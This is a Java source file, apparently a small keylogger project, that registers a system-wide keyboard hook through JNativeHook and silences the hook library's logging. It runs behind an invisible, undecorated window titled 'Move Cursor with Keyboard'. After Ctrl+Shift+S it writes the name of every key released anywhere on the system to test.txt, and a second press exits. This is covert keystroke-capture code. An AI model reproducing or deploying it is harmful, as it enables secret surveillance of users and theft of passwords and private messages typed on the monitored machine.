package key_logger;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.awt.*;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintStream;


public class GUI extends javax.swing.JFrame implements NativeKeyListener{
    Robot r;
    boolean a,b,c,d = false;
    String lastKey;
    String nextKey;
    int counter = 0;
    

    public GUI() throws IOException
    {
            
        createAndShowGUI();
    }
    
    private void createAndShowGUI()
    {
        setTitle("Move Cursor with Keyboard");
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        
        setUndecorated(true);
        setOpacity(0f);
        setVisible(true);
        
        try
        {
        r=new Robot();
        }catch(AWTException e){}
        
        addKeyListener(new KeyAdapter(){
            @Override
            public void keyPressed(KeyEvent e)
            {
                if(r==null) return;
                
                Point p=MouseInfo.getPointerInfo().getLocation();
                
                switch(e.getKeyCode())
                {
                    case KeyEvent.VK_UP: r.mouseMove(p.x,p.y-3); break;
                    case KeyEvent.VK_DOWN: r.mouseMove(p.x,p.y+3); break;
                    case KeyEvent.VK_LEFT: r.mouseMove(p.x-3,p.y); break;
                    case KeyEvent.VK_RIGHT: r.mouseMove(p.x+3,p.y); break;
                    case KeyEvent.VK_ENTER: r.mousePress(MouseEvent.BUTTON1_MASK); r.mouseRelease(MouseEvent.BUTTON1_MASK);
                }
            }
        });
    }
    
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">                          
    private void initComponents() {

        jLabel1 = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

        jLabel1.setText("Enter any text");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(210, 210, 210)
                .addComponent(jLabel1)
                .addContainerGap(221, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(56, 56, 56)
                .addComponent(jLabel1)
                .addContainerGap(44, Short.MAX_VALUE))
        );

        setSize(new java.awt.Dimension(517, 153));
        setLocationRelativeTo(null);
    }// </editor-fold>                        

    /**
     * @param args the command line arguments
     * @throws java.io.IOException
     */
    public static void main(String args[]) throws IOException {
        
        
        GUI gui = new GUI();
        
        LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
        }
        GlobalScreen.addNativeKeyListener(new GUI());
        
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        
        java.awt.EventQueue.invokeLater(() -> {
            try {
                new GUI().setVisible(true);
            } catch (IOException ex) {
                Logger.getLogger(GUI.class.getName()).log(Level.SEVERE, null, ex);
            }
        });
        
            
             
             
               
    }

    // Variables declaration - do not modify                     
    private javax.swing.JLabel jLabel1;
    // End of variables declaration                   

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        
        if (nke.getKeyCode() == NativeKeyEvent.VC_CONTROL) {
            a = true;
            }
         if (nke.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            b = true;
            }
          if (nke.getKeyCode() == NativeKeyEvent.VC_S && a && b) {
             counter++;
             a = false;
             b = false;
              if (counter==2) {
                  System.exit(0);
              }
             
             try 
             { 
                
                 System.setOut(new PrintStream(new File("test.txt"))); 
                 
             } 
             catch (FileNotFoundException e) 
             {
              } 
     
          }              
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        
          
          System.out.println("Pressed " + NativeKeyEvent.getKeyText(nke.getKeyCode()));
        
            }
       
}
